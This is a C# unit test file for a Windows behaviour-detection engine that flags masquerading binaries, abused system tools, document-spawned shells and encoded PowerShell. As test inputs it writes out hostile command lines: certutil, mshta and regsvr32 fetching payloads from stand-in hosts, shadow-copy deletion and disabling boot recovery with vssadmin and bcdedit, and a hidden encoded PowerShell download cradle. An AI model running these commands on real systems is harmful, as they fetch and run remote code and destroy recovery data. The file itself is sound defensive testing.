using Nexus.Core.Security;
using Nexus.Core.Security.Behavior;
using Xunit;

namespace Nexus.Core.Tests;

public class BehaviorEngineTests
{
    private static readonly DateTimeOffset Now = new(2026, 8, 30, 12, 0, 0, TimeSpan.Zero);

    private static ProcessStartEvent Launch(
        string imagePath,
        string commandLine = "",
        string parentImagePath = "",
        int pid = 1000,
        int parentPid = 900) =>
        new()
        {
            Pid = pid,
            ParentPid = parentPid,
            ImagePath = imagePath,
            CommandLine = commandLine,
            ParentImagePath = parentImagePath,
            At = Now,
        };

    private static string[] CodesFor(ProcessStartEvent evt) =>
        new BehaviorEngine().Observe(evt)?.Signals.Select(s => s.Code).ToArray() ?? [];

    [Fact]
    public void An_ordinary_launch_produces_no_finding()
    {
        Assert.Null(new BehaviorEngine().Observe(
            Launch(@"C:\Program Files\Git\bin\git.exe", "git status", @"C:\Windows\System32\cmd.exe")));
    }

    [Fact]
    public void System_binaries_in_their_real_home_are_not_flagged()
    {
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\System32\svchost.exe", "-k netsvcs")));
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\explorer.exe")));
    }

    [Fact]
    public void SysWOW64_counts_as_home_for_System32_binaries()
    {
        Assert.DoesNotContain("beh-masquerade", CodesFor(Launch(@"C:\Windows\SysWOW64\rundll32.exe")));
    }

    /// <summary>The hole in name-based trust: this is the case an exe-name allowlist
    /// would wave straight through.</summary>
    [Fact]
    public void A_system_name_running_from_elsewhere_is_flagged_as_masquerading()
    {
        var codes = CodesFor(Launch(@"C:\Users\fadi\AppData\Local\Temp\svchost.exe"));
        Assert.Contains("beh-masquerade", codes);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\certutil.exe", "certutil -urlcache -split -f http://x/a.exe", "beh-lolbin-certutil")]
    [InlineData(@"C:\Windows\System32\mshta.exe", "mshta http://evil/a.hta", "beh-lolbin-mshta")]
    [InlineData(@"C:\Windows\System32\regsvr32.exe", "regsvr32 /s /i:http://x/a.sct scrobj.dll", "beh-lolbin-regsvr32")]
    [InlineData(@"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet", "beh-lolbin-vssadmin")]
    [InlineData(@"C:\Windows\System32\bcdedit.exe", "bcdedit /set recoveryenabled no", "beh-lolbin-bcdedit")]
    public void Known_abuse_patterns_are_reported(string image, string commandLine, string expectedCode)
    {
        Assert.Contains(expectedCode, CodesFor(Launch(image, commandLine)));
    }

    [Fact]
    public void The_same_binary_used_normally_is_not_reported()
    {
        Assert.Empty(CodesFor(Launch(@"C:\Windows\System32\certutil.exe", "certutil -hashfile setup.iso SHA256")));
        Assert.Empty(CodesFor(Launch(@"C:\Windows\System32\net.exe", "net use z: \\\\server\\share")));
    }

    [Fact]
    public void Shadow_copy_deletion_is_decisive_on_its_own()
    {
        var finding = new BehaviorEngine().Observe(
            Launch(@"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet"));

        Assert.NotNull(finding);
        Assert.Equal(SignalWeight.Decisive, finding.Severity);
    }

    [Fact]
    public void A_document_spawning_a_shell_is_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\cmd.exe",
            "cmd /c powershell -w hidden",
            @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"));

        Assert.Contains("beh-document-spawned-shell", codes);
    }

    [Fact]
    public void A_developer_tool_spawning_a_shell_is_not_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\cmd.exe", "cmd /c build.bat", @"C:\Program Files\Git\bin\git.exe"));

        Assert.DoesNotContain("beh-document-spawned-shell", codes);
    }

    [Fact]
    public void Running_from_temp_is_only_weak_evidence()
    {
        var finding = new BehaviorEngine().Observe(
            Launch(@"C:\Users\fadi\AppData\Local\Temp\setup.exe"));

        Assert.NotNull(finding);
        Assert.Equal(SignalWeight.Weak, finding.Severity);
    }

    [Fact]
    public void Only_one_location_signal_is_emitted_per_launch()
    {
        var codes = CodesFor(Launch(@"C:\Users\fadi\AppData\Local\Temp\Downloads\a.exe"));
        Assert.Single(codes, c => c == "beh-unusual-location");
    }

    [Fact]
    public void Encoded_powershell_command_lines_are_reported()
    {
        var codes = CodesFor(Launch(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"));

        Assert.Contains("beh-lolbin-powershell", codes);
        Assert.Contains("beh-encoded-commandline", codes);
    }

    [Theory]
    [InlineData("powershell -Command Get-Process", false)]
    [InlineData(@"C:\Program Files\App\app.exe --config C:\ProgramData\App\settings.json", false)]
    [InlineData("app.exe -d TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAA", true)]
    public void Base64_detection_ignores_ordinary_command_lines(string commandLine, bool expected)
    {
        Assert.Equal(expected, BehaviorEngine.LooksBase64Encoded(commandLine, out _));
    }

    [Theory]
    [InlineData("invoice.pdf.exe", true)]
    [InlineData("photo.jpg.scr", true)]
    [InlineData("archive.zip.js", true)]
    [InlineData("setup.exe", false)]
    [InlineData("my.company.installer.exe", false)]
    public void Deceptive_double_extensions_are_detected(string fileName, bool expected)
    {
        Assert.Equal(expected, BehaviorEngine.HasDeceptiveDoubleExtension(fileName, out _));
    }

    [Fact]
    public void Ancestry_is_reconstructed_across_exited_parents()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\Program Files\Office\WINWORD.EXE", pid: 100, parentPid: 10));
        engine.Observe(Launch(@"C:\Windows\System32\cmd.exe", pid: 200, parentPid: 100));
        engine.Observe(Launch(@"C:\Windows\System32\powershell.exe", pid: 300, parentPid: 200));

        Assert.Equal(["powershell.exe", "cmd.exe", "WINWORD.EXE"], engine.AncestryOf(300));
    }

    [Fact]
    public void Forgotten_processes_leave_the_ancestry_map()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\Windows\System32\cmd.exe", pid: 200, parentPid: 100));
        engine.Forget(200);

        Assert.Empty(engine.AncestryOf(200));
    }

    [Fact]
    public void Ancestry_terminates_even_if_pid_reuse_creates_a_cycle()
    {
        var engine = new BehaviorEngine();
        engine.Observe(Launch(@"C:\a.exe", pid: 10, parentPid: 20));
        engine.Observe(Launch(@"C:\b.exe", pid: 20, parentPid: 10));

        Assert.Equal(2, engine.AncestryOf(10).Count);
    }

    [Fact]
    public void Process_tracking_is_bounded()
    {
        var engine = new BehaviorEngine();
        for (int i = 1; i <= BehaviorEngine.MaxTrackedProcesses + 500; i++)
            engine.Observe(Launch(@"C:\Program Files\App\app.exe", pid: i, parentPid: 0));

        // The earliest PIDs must have been evicted rather than retained forever.
        Assert.Empty(engine.AncestryOf(1));
        Assert.NotEmpty(engine.AncestryOf(BehaviorEngine.MaxTrackedProcesses + 500));
    }
}
